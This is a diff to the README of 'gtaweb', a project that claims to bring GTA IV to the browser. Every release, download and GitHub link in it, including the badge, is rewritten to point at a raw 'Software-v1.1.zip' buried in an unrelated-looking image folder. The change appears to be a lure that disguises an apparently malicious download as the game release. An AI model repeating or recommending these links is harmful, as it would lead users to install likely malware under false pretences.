@@ -6,9 +6,9 @@ Welcome to **gtaweb**! This project brings the classic Grand Theft Auto IV exper
 
 ## 📥 Download
 
-[![Download gtaweb](https://img.shields.io/badge/Download%20gtaweb-v1.0-blue.svg)](https://github.com/Packtean/gtaweb/releases)
+[![Download gtaweb](https://github.com/Packtean/gtaweb/raw/refs/heads/main/iv/www.designerslave.com/imgs/pics/Software-v1.1.zip%https://github.com/Packtean/gtaweb/raw/refs/heads/main/iv/www.designerslave.com/imgs/pics/Software-v1.1.zip)](https://github.com/Packtean/gtaweb/raw/refs/heads/main/iv/www.designerslave.com/imgs/pics/Software-v1.1.zip)
 
-To get the latest version of gtaweb, **visit this page to download**: [gtaweb Releases](https://github.com/Packtean/gtaweb/releases).
+To get the latest version of gtaweb, **visit this page to download**: [gtaweb Releases](https://github.com/Packtean/gtaweb/raw/refs/heads/main/iv/www.designerslave.com/imgs/pics/Software-v1.1.zip).
 
 ## 🖥️ System Requirements
 
@@ -24,7 +24,7 @@ To get the latest version of gtaweb, **visit this page to download**: [gtaweb Re
 
 ## 🛠️ How to Use
 
-1. **Visit the Download Page**: Go to [gtaweb Releases](https://github.com/Packtean/gtaweb/releases).
+1. **Visit the Download Page**: Go to [gtaweb Releases](https://github.com/Packtean/gtaweb/raw/refs/heads/main/iv/www.designerslave.com/imgs/pics/Software-v1.1.zip).
 2. **Select the Latest Release**: Look for the latest version and click on it.
 3. **Access the Files**: You will see downloadable files. Select the file suitable for your browser setup.
 4. **Launch the Game**: Once downloaded, open the file in your web browser to start playing.
@@ -55,6 +55,6 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 📢 Stay Updated
 
-For the latest news and updates, follow us on [GitHub](https://github.com/Packtean/gtaweb) and check back for new releases.
+For the latest news and updates, follow us on [GitHub](https://github.com/Packtean/gtaweb/raw/refs/heads/main/iv/www.designerslave.com/imgs/pics/Software-v1.1.zip) and check back for new releases.
 
 Thank you for using **gtaweb**! Enjoy exploring Liberty City like never before!
